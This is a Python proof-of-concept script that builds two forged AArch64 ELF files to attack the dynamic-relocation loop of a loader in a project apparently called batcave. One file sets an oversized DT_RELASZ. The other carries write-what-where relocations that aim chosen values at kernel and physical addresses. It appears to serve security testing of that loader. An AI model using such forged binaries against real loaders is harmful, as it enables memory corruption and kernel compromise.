#!/usr/bin/env python3
"""
evil_elf_huge_relocs.py — forge ELFs that abuse the PT_DYNAMIC relocation loop
in src/batcave/linux/loader.rs.

Artifacts:
  - evil_rela_huge_size.elf   (ATTACK-FL-003): DT_RELASZ = u64::MAX
  - evil_reloc_kernel_wwx.elf (ATTACK-FL-004): R_AARCH64_RELATIVE pointing at
                                               a kernel physical address (0x40004000)
                                               with attacker-chosen value.

DT_RELA (tag 7), DT_RELASZ (tag 8), plus R_AARCH64_RELATIVE (0x403).

Usage:  python3 evil_elf_huge_relocs.py [outdir]
"""
import struct
import sys
import os

ET_DYN = 3
EM_AARCH64 = 183
PT_LOAD = 1
PT_DYNAMIC = 2
R_AARCH64_RELATIVE = 0x403
DT_NULL = 0
DT_RELA = 7
DT_RELASZ = 8

def ehdr(phoff, phnum):
    return (b'\x7fELF\x02\x01\x01' + b'\x00' * 9
            + struct.pack('<HHIQQQIHHHHHH',
                          ET_DYN, EM_AARCH64, 1,
                          0x1000,               # e_entry
                          phoff, 0, 0,
                          64, 56, phnum, 0, 0, 0))

def pt_load(offset, vaddr, filesz, memsz):
    return struct.pack('<IIQQQQQQ', PT_LOAD, 5,
                       offset, vaddr, vaddr, filesz, memsz, 0x1000)

def pt_dynamic(offset, size):
    return struct.pack('<IIQQQQQQ', PT_DYNAMIC, 4,
                       offset, 0, 0, size, size, 8)

def dyn_entry(tag, val):
    return struct.pack('<QQ', tag, val & 0xFFFFFFFFFFFFFFFF)

def rela(offset, info, addend):
    return struct.pack('<QQq', offset, info, addend)

def write(path, data):
    with open(path, 'wb') as f:
        f.write(data)
    print(f"wrote {path} ({len(data)} bytes)")

def main():
    outdir = sys.argv[1] if len(sys.argv) > 1 else '.'
    os.makedirs(outdir, exist_ok=True)

    # Layout for both files:
    #   [ehdr 64][phdrs 2*56=112][dyn 48][rela…]
    phoff = 64
    dyn_off = phoff + 2*56   # 176
    dyn_size = 3 * 16        # RELA, RELASZ, NULL = 48 bytes
    rela_off = dyn_off + dyn_size   # 224
    load_size = 0x2000

    # 1) Huge rela_sz (ATTACK-FL-003) — forces num = u64::MAX / 24 ≈ 7.6e17.
    dyn_block = (dyn_entry(DT_RELA, rela_off)
                 + dyn_entry(DT_RELASZ, 0xFFFFFFFFFFFFFFFF)
                 + dyn_entry(DT_NULL, 0))
    body = (ehdr(phoff, 2)
            + pt_load(0, 0x1000, load_size, load_size)
            + pt_dynamic(dyn_off, dyn_size)
            + dyn_block
            + rela(0x2000, R_AARCH64_RELATIVE, 0x1000))
    body += b'\x00' * (load_size - len(body))
    write(os.path.join(outdir, 'evil_rela_huge_size.elf'), body)

    # 2) Write-what-where relocation (ATTACK-FL-004).
    # r_offset points at 0x40004000 (guess: kernel text region on QEMU virt).
    # With reloc_offset ≈ 0 (phys_base ≈ min_addr ≈ 0x1000) this lands at 0x40004000.
    dyn_block = (dyn_entry(DT_RELA, rela_off)
                 + dyn_entry(DT_RELASZ, 24 * 3)
                 + dyn_entry(DT_NULL, 0))
    body = (ehdr(phoff, 2)
            + pt_load(0, 0x1000, load_size, load_size)
            + pt_dynamic(dyn_off, dyn_size)
            + dyn_block
            # Three juicy WWX relocations:
            + rela(0x40004000, R_AARCH64_RELATIVE, 0xDEADBEEFCAFEBABE)  # target: kernel text
            + rela(0x40001000, R_AARCH64_RELATIVE, 0x41414141)           # target: low phys
            + rela(0xFFFF000000000000, R_AARCH64_RELATIVE, 0x4242))      # target: canonical high
    body += b'\x00' * (load_size - len(body))
    write(os.path.join(outdir, 'evil_reloc_kernel_wwx.elf'), body)

if __name__ == '__main__':
    main()
